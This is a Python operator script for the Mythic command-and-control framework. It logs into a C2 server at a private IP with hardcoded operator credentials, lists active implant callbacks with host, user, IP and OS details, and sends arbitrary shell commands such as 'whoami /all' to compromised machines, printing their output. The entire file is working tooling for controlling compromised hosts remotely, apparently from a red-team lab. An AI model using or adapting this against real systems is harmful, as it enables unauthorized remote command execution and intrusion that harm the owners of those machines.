#!/usr/bin/env python3
# =============================================================================
# Mythic C2 operator helper — list callbacks and issue tasks through a beacon.
# Usage (FROM Kali):
#   python3 mythic_op.py callbacks
#   python3 mythic_op.py task <display_id> "<command>" "<params>"
#     e.g.  python3 mythic_op.py task 1 shell "whoami /all"
# =============================================================================
import asyncio, sys
from mythic import mythic

SERVER, PORT = "10.3.10.20", 7443
USER, PW = "tlo_operator", "Mythic_TLO_2026!"

async def connect():
    return await mythic.login(username=USER, password=PW, server_ip=SERVER,
                              server_port=PORT, ssl=True, timeout=-1)

async def list_callbacks():
    m = await connect()
    cbs = await mythic.get_all_active_callbacks(mythic=m)
    print("active callbacks:", len(cbs))
    for c in cbs:
        print("  id=%s host=%s user=%s ip=%s pid=%s os=%s" % (
            c.get("display_id"), c.get("host"), c.get("user"),
            c.get("ip"), c.get("pid"), c.get("os")))

async def issue(display_id, command, params):
    m = await connect()
    out = await mythic.issue_task_and_waitfor_task_output(
        mythic=m, command_name=command, parameters=params,
        callback_display_id=int(display_id), timeout=120)
    print(out.decode(errors="replace") if isinstance(out, bytes) else out)

def main():
    if len(sys.argv) < 2:
        print(__doc__); return
    if sys.argv[1] == "callbacks":
        asyncio.run(list_callbacks())
    elif sys.argv[1] == "task":
        did, cmd = sys.argv[2], sys.argv[3]
        params = sys.argv[4] if len(sys.argv) > 4 else ""
        asyncio.run(issue(did, cmd, params))

main()
